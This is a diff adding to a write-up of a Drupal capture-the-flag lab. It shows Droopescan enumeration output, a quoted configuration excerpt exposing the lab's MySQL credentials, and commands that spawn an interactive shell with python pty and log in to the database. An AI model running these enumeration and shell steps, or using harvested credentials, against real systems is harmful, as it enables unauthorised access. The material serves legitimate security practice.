@@ -43,4 +43,79 @@ Nmap done: 1 IP address (1 host up) scanned in 17.33 seconds
 
 - For scanning the Drupal websites (Plugin based scanner) found called Droopescan
 
-- 
+# Droopescan - Drupal website
+
+```
+ droopescan scan drupal -u http://192.168.240.193/ -t 32
+
+[+] Plugins found:
+    ctools http://192.168.240.193/sites/all/modules/ctools/
+        http://192.168.240.193/sites/all/modules/ctools/LICENSE.txt
+        http://192.168.240.193/sites/all/modules/ctools/API.txt
+    views http://192.168.240.193/sites/all/modules/views/
+        http://192.168.240.193/sites/all/modules/views/README.txt
+        http://192.168.240.193/sites/all/modules/views/LICENSE.txt
+    profile http://192.168.240.193/modules/profile/
+    php http://192.168.240.193/modules/php/
+    image http://192.168.240.193/modules/image/
+
+[+] Themes found:
+    seven http://192.168.240.193/themes/seven/
+    garland http://192.168.240.193/themes/garland/
+
+[+] Possible version(s):
+    7.22
+    7.23
+    7.24
+    7.25
+    7.26
+
+[+] Possible interesting urls found:
+    Default admin - http://192.168.240.193/user/login
+```
+
+#Finding Creds for Mysql
+
+- flag1 leads to coonfig file and also checked the flag4 in /etc/passwd it leads to root flag in root directory.
+
+![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/6c9d2e75-2985-4858-8691-a3facec85183)
+
+```
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren't the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupaldb',
+      'username' => 'dbuser',
+      'password' => 'R0ck3t',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+
+/**
+
+```
+using these commands we can enter into interactive shell and able to access the my sql DB:
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+mysql -u dbuser -p
+
+use drupaldb;
+
+show tables;
+```
